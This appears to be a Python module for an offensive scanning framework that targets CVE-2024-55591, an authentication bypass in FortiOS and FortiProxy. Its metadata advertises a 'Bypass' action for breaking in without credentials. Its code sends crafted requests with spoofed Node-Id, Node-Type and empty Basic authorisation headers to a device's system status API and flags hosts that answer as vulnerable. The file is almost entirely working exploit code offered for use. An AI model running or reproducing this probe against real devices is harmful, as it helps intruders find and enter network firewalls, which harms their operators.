import urllib3
import sys
import smf
from lib.smf.ssl.netssl import *

metadata = {
    "Name": "Fortinet scan API login bypass",
    "Description": """
An Authentication Bypass Using an Alternate Path or Channel 
vulnerability [CWE-288] affecting FortiOS version 7.0.0 
through 7.0.16 and FortiProxy version 7.0.0 through 7.0.19 and 7.2.0 
through 7.2.12 allows a remote attacker to gain super-admin 
privileges via crafted requests to Node.js websocket module.
""",
    "Author": ["zxelzy"],
    "Action": [
        ["Bypass", {"Description": "Breaking in without username & password"}],
        ["Scaner", {"Description": "Scan to ensure security gaps"}],
    ],
    "DefaultAction": "Scaner",
    "License": "SMF License",
    "Date": "2025-01-17",
    "Vulnerability": {
        "CVE": "CVE-2024-55591",
        "Severity": "CRITICAL",
        "Published": "2025-01-14",
        "Updated": "2025-01-14",
        "References": [
            "https://nvd.nist.gov/vuln/detail/CVE-2024-55591",
            "https://attackerkb.com/topics/5K4caFRSPo/cve-2024-55591",
        ],
    },
}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
REQUIRED_OPTIONS = {"URL": ""}


def execute(options):
    target = options.get("URL")
    port = 443

    url = f"https://{target}:{port}/api/v2/monitor/system/status"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Node-Id": "1",
        "Node-Type": "fgfm",
        "Authorization": "Basic Og==",
    }

    try:
        res = storm_ssl("GET", url, headers=headers)
        if res.status_code == 200 and "version" in res.text.lower():
            smf.printf(f"{'='*40}")
            smf.printf(f"[!] VULNERABLE: {target}")
            smf.printf(
                f"[+] System Info: {res.json().get('results', {}).get('version', 'N/A')}"
            )
        else:
            smf.printf("[-] Target not vulnerable or patched.")

    except KeyboardInterrupt:
        return
    except Exception as e:
        smf.printf(f"[-] GLOBAL ERROR =>", e, file=sys.stderr, flush=True)
